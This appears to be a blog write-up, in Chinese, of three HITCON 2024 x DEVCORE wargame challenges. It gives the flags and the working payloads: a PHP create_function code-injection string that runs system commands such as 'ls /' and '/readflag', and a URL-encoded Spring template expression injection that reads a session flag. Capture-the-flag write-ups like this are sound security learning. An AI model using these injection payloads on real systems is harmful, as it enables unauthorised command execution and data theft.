---
layout: post
title: "HITCON 2024 x DEVCORE Wargame"
date: 2024-8-12
categories: [writeup]
---

# Welcome

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/welcome.png)

使用[線上工具](https://www.dcode.fr/rc4-cipher)解密

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/welcome-solve.png)

flag: `DEVCORE{h0pe_y0u_enj0y_0ur_wargame}`

# Supercalifragilisticexpialidocious

明顯 `create_function('', $code);` 有洞。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Supercalifragilisticexpialidocious.png)

使用 [exploitDB](https://www.exploit-db.com/exploits/32417) 的 payload

payload: `return -1 * var_dump($a[""]);}phpinfo();/*"]`

成功看到 `phpinfo()`。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Supercalifragilisticexpialidocious-phpinfo.png)

payload: `return -1 * var_dump($a[""]);}system('ls /');/*"]`

發現 `/readflag`。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Supercalifragilisticexpialidocious-ls.png)

payload: `return -1 * var_dump($a[""]);}system('/readflag');/*"]`

執行成功取得 flag。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Supercalifragilisticexpialidocious-readflag.png)

flag: `DEVCORE{o1d_th1ng_1s_g00d}`

# Expressionism

在 `IndexController.java` 看到 `FLAG` 被放在 session。

```java
session.setAttribute("FLAG", System.getenv("FLAG"));
```

`index.jsp` 中有可以 injection 的地方。

```jsp
<p><spring:message code="life.quotes.${id}" /></p>
```

在 [Hack tricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java) 找到可用 `${}` injection。

payload: `/?id=${FLAG}`

送出後發現有違法字元。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Expressionism-payload.png)

payload: `/?id=%24%7BFLAG%7D`

把 payload 做 url encoding 後再試一次，成功取得 flag。

![image]({{site.baseurl}}/assets/images/HITCON-2024-x-DEVCORE-Wargame/Expressionism-success.png)

flag: `DEVCORE{d1d_y0u_kn0w_th1s_b3f0r3}`